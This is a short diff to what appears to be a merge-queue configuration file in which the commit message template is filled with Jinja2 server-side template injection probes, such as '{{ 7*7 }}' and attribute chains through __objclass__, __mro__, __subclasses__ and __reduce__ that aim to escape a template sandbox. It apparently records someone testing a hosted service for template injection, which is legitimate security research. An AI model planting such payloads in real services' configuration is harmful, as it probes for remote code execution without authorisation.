@@ -4,12 +4,12 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
+      SSTI: {{ 7*7 }}
       T1_OR_OBJCL: {{ [dict]|map(attribute="__or__")|map(attribute="__objclass__")|list }}
-      T2_OR_MRO: {{ [dict]|map(attribute="__or__")|map(attribute="__objclass__")|map(attribute="__mro__")|list }}
-      T3_OR_SC: {{ [dict]|map(attribute="__or__")|map(attribute="__objclass__")|map(attribute="__mro__")|map(attribute="__subclasses__")|list }}
-      T4_ROR_OBJCL: {{ [dict]|map(attribute="__ror__")|map(attribute="__objclass__")|list }}
-      T5_IOR_OBJCL: {{ [dict]|map(attribute="__ior__")|map(attribute="__objclass__")|list }}
-      T6_OR_BASES: {{ [dict]|map(attribute="__or__")|map(attribute="__objclass__")|map(attribute="__bases__")|list }}
+      T2_DIRECT_OBJCL: {{ [dict]|map(attribute="__objclass__")|list }}
+      T3_OR_REDUCE: {{ [dict]|map(attribute="__or__")|map(attribute="__reduce__")|list }}
+      T4_VALS: {{ [dict]|map(attribute="values")|list }}
+      T5_DIRECT_INITSUB: {{ [dict]|map(attribute="__init_subclass__")|list }}
 pull_request_rules:
   - name: q
     conditions:
